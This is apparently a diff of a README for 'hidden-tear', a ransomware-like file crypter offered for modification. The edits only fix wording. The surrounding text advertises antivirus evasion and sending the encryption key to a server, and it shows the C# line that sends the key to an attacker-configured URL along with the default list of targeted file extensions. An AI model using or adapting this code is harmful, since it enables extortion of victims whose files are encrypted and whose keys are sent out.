@@ -12,7 +12,7 @@ It's a ransomware-like file crypter sample which can be modified for specific pu
 * Sends encryption key to a server.
 * Encrypted files can be decrypt in decrypter program with encryption key.
 * Creates a text file in Desktop with given message.
-* Small file size (12 KB)
+* Small file size (12 KB).
 * Doesn't detected to antivirus programs (15/08/2015) http://nodistribute.com/result/6a4jDwi83Fzt
 
 **Demonstration Video**
@@ -21,7 +21,7 @@ https://www.youtube.com/watch?v=LtiRISepIfs
 
 **Usage**
 
-* You need to have a web server which supports scripting languages like php,python etc. Change this line with your URL. (You better use Https connection to avoid eavesdropping)
+* You need to have a web server which support scripting languages like php,python etc. Change this line with your URL. (You better use Https connection to avoid eavesdropping)
 
   `string targetURL = "https://www.example.com/hidden-tear/write.php?info=";`
 
@@ -33,7 +33,7 @@ https://www.youtube.com/watch?v=LtiRISepIfs
   var conent = new System.Net.WebClient().DownloadString(fullUrl);
   
   ```
-* Target file extensions can be change. Default list:
+* Target file extensions can be change. Default lists:
 
 ```
 var validExtensions = new[]{".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
